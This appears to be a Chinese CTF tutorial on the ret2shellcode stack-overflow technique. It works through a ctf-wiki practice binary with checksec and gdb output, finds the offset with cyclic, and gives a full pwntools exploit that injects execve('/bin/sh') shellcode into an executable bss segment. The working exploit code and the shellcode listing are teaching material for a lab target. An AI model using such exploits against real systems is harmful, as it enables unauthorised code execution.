> 参考示例：
>
> [https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example)
>
> 参考资料[https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2shellcode](https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2shellcode)
>
> [https://www.cnblogs.com/da1sy/p/12299134.html](https://www.cnblogs.com/da1sy/p/12299134.html)
>
> [https://baijiahao.baidu.com/s?id=1665277270769279870&wfr=spider&for=pc](https://baijiahao.baidu.com/s?id=1665277270769279870&wfr=spider&for=pc)
>

> ### <font style="color:#F5222D;">感谢@ILIB师傅的指点</font>

---

<font style="background-color:#FBDE28;">2023年01月05日 21:28 更新</font>

有师傅反应本篇文章的exp无法获取shell，这是由于ubuntu或kali的较高版本会导致程序的数据段没有可执行权限，如Ubuntu 20和kali 2022：

![](https://cdn.nlark.com/yuque/0/2023/png/574026/1672925457856-adb1d20a-b320-4be3-ac8a-655e6119a522.png)

但较旧的Ubuntu16、Ubuntu 18和本篇文章使用的kali 2019的数据段则可以执行：

![](https://cdn.nlark.com/yuque/0/2023/png/574026/1672925696590-38a35d50-00b3-41c2-9dfe-7cd3ae14d47f.png)

所以如果你遇到了exp无法打穿的问题，要考虑到是不是你系统过高的缘故，毕竟想来想去数据段也不需要可执行权限吧（安全性）...

---

### 原理
ret2shellcode，即控制程序执行 shellcode代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。**一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码**。

> 说白了，程序中这次没有类似于system("/bin/sh")后门函数，需要自己来填充
>

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。

### 利用关键
1、程序存在溢出，并且还要能够控制返回地址

2、程序运行时，shellcode 所在的区域要拥有执行权限（NX保护关闭、bss段可执行）

3、操作系统还需要关闭 ASLR (地址空间布局随机化) 保护 。（或关闭PIE保护）

### 解题步骤
+ 先使用cyclic测试出溢出点，构造初步的payload
+ 确定程序中的溢出位，看是否可在bss段传入数据
+ 使用GDB的vmmap查看bss段（一般为用户提交的变量在bss段中）
+ 先发送为shellcode的数据写入到bss段
+ 在将程序溢出到上一步用户提交变量的地址

### 示例
将文件下载下来，先运行一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596447379206-bc3ede49-8582-4add-a983-105a95b6ebdd.png)

程序提示说没有这次没有system，也就是说程序中没有system("/bin/sh")后门函数

检查一下文件的保护：

```powershell
root@kali:~/桌面/CTF# pwn checksec --file=ret2shellcode
[*] '/root/\xe6\xa1\x8c\xe9\x9d\xa2/CTF/ret2shellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
root@kali:~/桌面/CTF# 
```

32位程序，几乎没有任何的保护，载入IDA查看

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596448668184-09ad5078-ccd2-4e83-afd5-a799cd75c650.png)

果然没有后门函数，这意味着我们必须手动构造

main函数的伪代码如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596448849034-8fe189ea-ee9f-40e6-b957-4d292fdc6b37.png)

可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段，如下图所示

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596448882497-f49d7995-e03a-4414-be55-985aa8a20785.png)

动态调试一下，看看这个 bss 段是否可执行：

```powershell
root@kali:~/桌面/CTF# gdb ret2shellcode
GNU gdb (Debian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ret2shellcode...done.
gdb-peda$ b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gdb-peda$ run
Starting program: /root/桌面/CTF/ret2shellcode 

[----------------------------------registers-----------------------------------]
EAX: 0xf7faddc8 --> 0xffffd30c --> 0xffffd4bc ("SHELL=/bin/bash")
EBX: 0x0 
ECX: 0xd7d234b0 
EDX: 0xffffd294 --> 0x0 
ESI: 0xf7fac000 --> 0x1d9d6c 
EDI: 0xf7fac000 --> 0x1d9d6c 
EBP: 0xffffd268 --> 0x0 
ESP: 0xffffd1e0 --> 0x0 
EIP: 0x8048536 (<main+9>:	mov    eax,ds:0x804a060)
EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804852e <main+1>:	mov    ebp,esp
   0x8048530 <main+3>:	and    esp,0xfffffff0
   0x8048533 <main+6>:	add    esp,0xffffff80
=> 0x8048536 <main+9>:	mov    eax,ds:0x804a060
   0x804853b <main+14>:	mov    DWORD PTR [esp+0xc],0x0
   0x8048543 <main+22>:	mov    DWORD PTR [esp+0x8],0x2
   0x804854b <main+30>:	mov    DWORD PTR [esp+0x4],0x0
   0x8048553 <main+38>:	mov    DWORD PTR [esp],eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd1e0 --> 0x0 
0004| 0xffffd1e4 --> 0xc30000 
0008| 0xffffd1e8 --> 0x1 
0012| 0xffffd1ec --> 0xf7ffc8a0 --> 0x0 
0016| 0xffffd1f0 --> 0xffffd240 --> 0x1 
0020| 0xffffd1f4 --> 0x0 
0024| 0xffffd1f8 --> 0xf7ffd000 --> 0x28f2c 
0028| 0xffffd1fc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, main () at ret2shellcode.c:8
8	ret2shellcode.c: 没有那个文件或目录.
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/root/桌面/CTF/ret2shellcode
0x08049000 0x0804a000 r-xp	/root/桌面/CTF/ret2shellcode
0x0804a000 0x0804b000 rwxp	/root/桌面/CTF/ret2shellcode
0xf7dd2000 0xf7fa9000 r-xp	/usr/lib32/libc-2.28.so
0xf7fa9000 0xf7faa000 ---p	/usr/lib32/libc-2.28.so
0xf7faa000 0xf7fac000 r-xp	/usr/lib32/libc-2.28.so
0xf7fac000 0xf7fad000 rwxp	/usr/lib32/libc-2.28.so
0xf7fad000 0xf7fb0000 rwxp	mapped
0xf7fcd000 0xf7fcf000 rwxp	mapped
0xf7fcf000 0xf7fd2000 r--p	[vvar]
0xf7fd2000 0xf7fd4000 r-xp	[vdso]
0xf7fd4000 0xf7ffb000 r-xp	/usr/lib32/ld-2.28.so
0xf7ffc000 0xf7ffd000 r-xp	/usr/lib32/ld-2.28.so
0xf7ffd000 0xf7ffe000 rwxp	/usr/lib32/ld-2.28.so
0xfffdd000 0xffffe000 rwxp	[stack]
gdb-peda$ 
```

找到地址0x804A080所属的区间：

> 0x0804a000 0x0804b000 rwxp	/root/桌面/CTF/ret2shellcode
>

通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限

一切完成后，可以发现这个文件可以进行ret2shellcode

重新动态调试，计算偏移（前面讲过，这里不再说了）

```powershell
root@kali:~/桌面/CTF# cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
root@kali:~/桌面/CTF# gdb ret2shellcode
GNU gdb (Debian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ret2shellcode...done.
gdb-peda$ run
Starting program: /root/桌面/CTF/ret2shellcode 
No system for you this time !!!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
bye bye ~
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffac9c ("bye bye ~")
EDX: 0xf7fad890 --> 0x0 
ESI: 0xf7fac000 --> 0x1d9d6c 
EDI: 0xf7fac000 --> 0x1d9d6c 
EBP: 0x62616163 ('caab')
ESP: 0xffffd270 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
EIP: 0x62616164 ('daab')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x62616164
[------------------------------------stack-------------------------------------]
0000| 0xffffd270 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0004| 0xffffd274 ("faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0008| 0xffffd278 ("gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0012| 0xffffd27c ("haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0016| 0xffffd280 ("iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0020| 0xffffd284 ("jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0024| 0xffffd288 ("kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0028| 0xffffd28c ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x62616164 in ?? ()
gdb-peda$ 
[2]+  已停止               gdb ret2shellcode
root@kali:~/桌面/CTF# cyclic -l 0x62616164
112
root@kali:~/桌面/CTF# 
```

exp如下：

```powershell
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh()) #生成并汇编shellcode
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
```

> shellcode = asm(shellcraft.sh()) #生成并汇编shellcode
>

我们知道asm函数是对某个内容进行汇编，可是shellcraft.sh()的内容是什么呢？我们来看一下：

```python
#!/usr/bin/env python
from pwn import *

shellcode = asm(shellcraft.sh()) 

print shellcraft.sh()
```

```plain
root@kali:~/桌面/CTF# python 1.py
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

root@kali:~/桌面/CTF# 
```

从上面输出的内容可以看到，shellcraft.sh()的内容就是相当于执行了system('/bin/sh')或evecve('/bin/sh')

了解了以上的内容之后，我们看一下payload中的：shellcode.ljust(112, 'A') 

我们知道shellcode是字符串类型，上菜鸟教程上查找易得：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597297761070-5d015399-4d61-4809-9b43-5f15985b976d.png)

简单来说，str.ljust使用自定义字符将shellcode补齐为112个字符，因此shellcode打印出来就是：

```python
#!/usr/bin/env python
from pwn import *

shellcode = asm(shellcraft.sh()) 
payload=shellcode.ljust(112, 'A')

print payload
'''
print:
jhh///sh/bin\x89�h\x814$ri1�Qj\x04�Q��1�j\x0b̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
'''
```

注意一下payload：shellcode.ljust(112, 'A') + p32(buf2_addr)

首先我们将payload输入到变量s也就是栈上，然后将**<font style="color:#F5222D;">main函数的返回地址</font>**<font style="color:#000000;">覆盖为buf2_addr（此bss段可执行），之后main函数执行</font>strncpy(buf2, &s, 100u);（虽然shellcode被截断为100，但是被截断的内容只是A，并不影响shellcode的完整度），将内容复制到了buf2，由于**<font style="color:#F5222D;">main函数的返回地址被覆盖为shellcode的地址，因此在main函数执行完毕之后，EIP转向执行shellcode</font>**

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596450550818-003b2481-3fd8-4cb3-ba87-f0fb1dd752c1.png)

成功getshell

